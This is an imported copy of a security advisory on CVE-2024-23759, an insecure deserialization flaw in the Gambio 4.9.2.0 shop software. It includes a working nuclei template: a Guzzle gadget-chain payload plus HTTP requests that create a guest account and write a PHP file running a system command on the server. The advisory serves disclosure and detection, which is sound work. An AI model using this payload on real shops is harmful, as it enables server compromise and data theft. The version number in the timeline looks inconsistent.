---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2024-01-19_gambio-4920-insecure-deserialization.md
original_filename: 2024-01-19_gambio-4920-insecure-deserialization.md
title: Gambio 4.9.2.0 - Insecure Deserialization
category: documents
detected_topics:
- command-injection
- sso
- api-security
tags:
- imported
- documents
- command-injection
- sso
- api-security
language: en
raw_sha256: 1d4d95bac12c67568c86dc08a6484edbf11e45b8cda662374fb077bf7811918c
text_sha256: 523799e2a4908b60921ad7c36b3c87ae7dc01321ab8a587479fd6c9fe0ebd9ff
ingested_at: '2026-06-28T07:32:30Z'
sensitivity: unknown
redactions_applied: false
---

# Gambio 4.9.2.0 - Insecure Deserialization

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2024-01-19_gambio-4920-insecure-deserialization.md
- Source Type: markdown
- Detected Topics: command-injection, sso, api-security
- Ingested At: 2026-06-28T07:32:30Z
- Redactions Applied: False
- Raw SHA256: `1d4d95bac12c67568c86dc08a6484edbf11e45b8cda662374fb077bf7811918c`
- Text SHA256: `523799e2a4908b60921ad7c36b3c87ae7dc01321ab8a587479fd6c9fe0ebd9ff`


## Content

---
title: "Gambio 4.9.2.0 - Insecure Deserialization"
page_title: "usd-2023-0046 | usd HeroLab"
url: "https://herolab.usd.de/security-advisories/usd-2023-0046/"
final_url: "https://herolab.usd.de/security-advisories/usd-2023-0046/"
authors: ["Christian Poeschl", "Lukas Schraven"]
programs: ["Gambio"]
bugs: ["RCE", "Insecure deserialization", "Security code review"]
publication_date: "2024-01-19"
added_date: "2024-01-25"
source: "pentester.land/writeups.json"
original_index: 518
---

# 

# usd-2023-0046 | Gambio 4.9.2.0 - Insecure Deserialization

# 

**Product** : Gambio  
**Affected Version** : 4.9.2.0  
**Vulnerability Type** : CWE 502 - Deserialization of Untrusted Data  
**Security Risk** : Critical  
**Vendor URL** : <https://www.gambio.de/>  
**Vendor Status** : Fixed  
**CVE Number** : CVE-2024-23759

### Description

Gambio is software designed for running online shops.  
It provides various features and tools to help businesses manage their inventory, process orders, and handle customer interactions.

According to their homepage, the software is used by more than 25.000 shops.

The identified vulnerability within Gambio pertains to an insecure deserialization flaw, which ultimately allows an attacker to execute remote code on affected systems.  
Deserialization is a process that restores objects from their serialized form, often used for the exchange of data between different applications or components within a software system.  
However, if this process is not adequately implemented or secured, it can be exploited by malicious actors to execute arbitrary code remotely.

**Note:** Upon discovery, our team immediately initiated the responsible disclosure process by contacting the vendor behind Gambio.  
Unfortunately, despite multiple attempts, our attempts to engage the vendor in resolving this issue have been met with silence.  
The vulnerability is still unfixed.

The insecure deserialization vulnerability discovered in Gambio poses a significant risk to affected systems.  
As it allows remote code execution, adversaries could exploit this flaw to execute arbitrary commands, potentially resulting in complete system compromise, data exfiltration, or unauthorized access to sensitive information.

### Proof of Concept

The "search" parameter of the "Parcelshopfinder/AddAddressBookEntry" function is deserialized.

The **ParcelshopfinderController.inc.php** file contains the vulnerable function in line 291:
  
  
  $postnumber = abs(filter_var($postnumber, FILTER_SANITIZE_NUMBER_INT));  
  if ($postnumber == 0 || $this->isValidPostnummer($postnumber) !== true) {  
  $search  = unserialize(base64_decode($this->_getPostData('search')));
  $psfParams = [
  'street'  => $search[0],
  'house'  => $search[1],
  'zip'  => $search[2],
  'city'  => $search[3],
  'country'  => $search[4],
  'firstname'  => $firstname,
  'lastname'  => $lastname,
  'postnumber'  => $postnumber,
  'additional_info' => $additional_info,
  'error'  => 'invalid_postnumber',
  ];
  }

The serialized data must be base64 encoded, as shown in line 3 in the snippet above.  
The application is using "Guzzle" which can be used as a gadget chain to receive arbitrary code execution by writing arbitrary files.

The following nuclei template was created to check for the vulnerability:
  
  
  id: gambio-php-object-injection
  info:
  name: PHP Object injection in Gambio
  description: PHP object injection in Gambio. Writes a file into the web root as a proof
  tags: gambio,php
  author: ChristianPoeschl,LukasSchraven
  severity: critical
  variables:
  gambiouser: "{{rand_base(10)}}"
  filename: "my_products.php"
  payload2: "<?php echo system('whoami');?>"
  data: 'O:31:"GuzzleHttp\Cookie\FileCookieJar":4:{s:36:"{{hex_decode("00")}}GuzzleHttp\Cookie\CookieJar{{hex_decode("00")}}cookies";a:1:{i:0;O:27:"GuzzleHttp\Cookie\SetCookie":1:{s:33:"{{hex_decode("00")}}GuzzleHttp\Cookie\SetCookie{{hex_decode("00")}}data";a:9:{s:7:"Expires";i:1;s:7:"Discard";b:0;s:5:"Value";s:{{len(payload2)}}:"{{payload2}}";s:4:"Path";s:1:"/";s:4:"Name";s:4:"test";s:6:"Domain";s:13:"test.test.com";s:6:"Secure";b:0;s:8:"Httponly";b:0;s:7:"Max-Age";i:3;}}}s:39:"{{hex_decode("00")}}GuzzleHttp\Cookie\CookieJar{{hex_decode("00")}}strictMode";N;s:41:"{{hex_decode("00")}}GuzzleHttp\Cookie\FileCookieJar{{hex_decode("00")}}filename";s:{{len(filename)}}:"{{filename}}";s:52:"{{hex_decode("00")}}GuzzleHttp\Cookie\FileCookieJar{{hex_decode("00")}}storeSessionCookies";b:1;}'
  http:
  # create guest user
  - raw:
  - |
  POST /shop.php?do=CreateGuest/Proceed HTTP/1.1
  Host: {{Hostname}}
  Content-Type: application/x-www-form-urlencoded
  
  
       firstname=vvvv&lastname=vvvv&email_address={{gambiouser}}%40example.com&email_address_confirm={{gambiouser}}%40example.com&b2b_status=0&company=&vat=&street_address=asd%3C+1&postcode=11111&city=11111&country=81&telephone=%2B4912312312312&fax=&action=process
  # attack
  - raw:
  - |
  POST /shop.php?do=Parcelshopfinder/AddAddressBookEntry HTTP/1.1
  Host: {{Hostname}}
  Content-Type: application/x-www-form-urlencoded
  
  
  checkout_started=0&search={{base64(data)}}&street_address=t&house_number=1&additional_info=&postcode=1&city=t&country=DE&firstname=t&lastname=t&postnumber=111111&psf_name=t
  
  matchers:
  - type: dsl
  name: php-version-payload-mismatch
  dsl:
  - status_code == 500 && !contains(body, "Cannot use object of type GuzzleHttp")
  - type: dsl
  dsl:
  - status_code == 500 && contains(body, "Cannot use object of type GuzzleHttp")

In the first step, a new guest user is created. This can be done in an automated way, while _normal_ user accounts need to solve a captcha.  
The template is creating a new file "my_products.php" containing the current username.

### Fix

It is recommended to deserialize objects only from trusted sources.

To workaround the vulnerability, Gambio users can disable the functionality the hard way and add a **die('disabled')** after line 257. Similar to the snippet below:
  
  
  public function actionAddAddressBookEntry()  {
  die('disabled');
  if (empty($_SESSION['customer_id'])) {
  return MainFactory::create('RedirectHttpControllerResponse', xtc_href_link(FILENAME_DEFAULT, '', 'SSL'));
  }
  }
  

Please pay attention that this may break some functionality, as this workaround was not tested!

**UPDATE 2024-02-14:**

In the meantime, the vendor has contacted us after the disclosure and released a new version in which the vulnerability has been fixed.

### References

  * <https://www.gambio.de>

### Timeline

  * **2023-12-08** : First contact request via email.
  * **2023-12-21** : Second contact request via email.
  * **2024-01-19** : This advisory is published.
  * **2024-02-19** : Version 4.2.9.1 released.

### Credits

This security vulnerability was identified by Christian Poeschl and Lukas Schraven of usd AG.
